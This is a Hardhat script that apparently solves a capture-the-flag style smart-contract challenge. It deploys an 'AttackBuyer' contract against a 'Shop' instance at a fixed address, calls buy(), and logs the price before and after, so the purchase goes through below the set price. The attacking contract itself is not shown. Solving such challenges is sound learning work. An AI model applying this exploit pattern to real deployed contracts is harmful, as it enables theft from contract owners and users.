const { ethers } = require("hardhat");

async function main() {
  const [owner, otherAccount] = await ethers.getSigners();
  // attach your instance address
  const Instance = "0xa3A32fBCBA0f6Dc475a9d525E78d36Ff6055fa85";
  const ShopContract = await ethers.getContractFactory("Shop");
  const Shop = ShopContract.attach(Instance);
  const AttackBuyerContract = await ethers.getContractFactory("AttackBuyer");
  const AttackBuyer = await AttackBuyerContract.deploy(Shop.address);
  await AttackBuyer.deployed();
  console.log(AttackBuyer.address);
  const initialPrice = await Shop.price();
  const tx = await AttackBuyer.buy();
  await tx.wait(1);
  const finalPrice = await Shop.price();
  console.log(initialPrice, finalPrice);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
